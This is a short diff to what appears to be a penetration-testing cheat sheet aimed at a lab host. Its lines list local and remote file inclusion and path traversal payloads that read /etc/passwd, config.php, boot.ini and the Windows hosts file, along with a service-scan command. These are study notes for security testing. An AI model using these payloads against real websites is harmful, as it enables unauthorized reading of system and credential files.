@@ -1049,7 +1049,8 @@ curl -s http://10.11.1.111/gallery.php?page=/etc/passwd
 http://10.11.1.111/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd && base64 -d savefile.php
 http://10.11.1.111/page=http://10.11.1.111/maliciousfile.txt%00 or ?
 ?page=php://filter/convert.base64-encode/resource=../config.php
-../../../../../boot.ini
+../../../../../boot.ini  #Windows file
+file=C:\windows\system32\drivers\etc\hosts  #Windows file
 
 amap -d 10.11.1.111 8000
 
